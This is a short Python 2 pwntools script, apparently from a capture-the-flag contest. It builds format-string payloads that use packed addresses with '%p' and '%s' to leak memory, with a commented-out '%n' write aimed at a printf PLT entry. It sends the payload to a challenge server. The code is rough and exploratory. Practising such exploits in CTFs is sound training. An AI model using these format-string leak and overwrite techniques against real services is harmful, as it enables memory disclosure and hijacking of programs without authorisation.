# Run in python 2
import struct

'''
PRINTF_PLT = 0x0804a010 # 0xffffcbe4 #
PRINTF_PLT_HIGH = PRINTF_PLT+2
FLAG_PUTS = 0x80486ea
FLAG_PUTS_LOW = FLAG_PUTS & 0xffff
FLAG_PUTS_HIGH = FLAG_PUTS >> 16
'''
## Test
FLAG=0x8048a93
buf = ''
buf += struct.pack('I', FLAG)
buf += '|%p'* 5 # Go to the location where the username is stored
# junk to make printf output 0x41 characters
'''buf += 'A'*(0x41-len(buf))
# this is where printf will write FLAG to PRINTF_PLT
buf += '%n'
'''
buf += "%s"
#print(buf)
with open("payload.in","w") as f:
    f.write(buf)


FLAG=0x8048a93
payload = ''

debug = 0
if debug==1:
    payload += "AAAA"
    payload += "%x--"*12
else:
    payload += struct.pack('I', FLAG)
    payload += struct.pack('I', FLAG+16) #idk what to do so just shift around 
    payload += '|%p'*6
    payload += "|%s"*2
    #payload += '|%p'*2 
    #payload += "|%s"*2

from pwn import *

conn = remote('challenges.csdc20t.ctf.sg',10012)
# Main menu
print(conn.recvuntil("username =>"))
conn.send(payload+"\n")
conn.interactive()
'''
print(conn.recvuntil("=>"))
conn.send("\n") #Don't care about password
print(conn.recvall())
'''


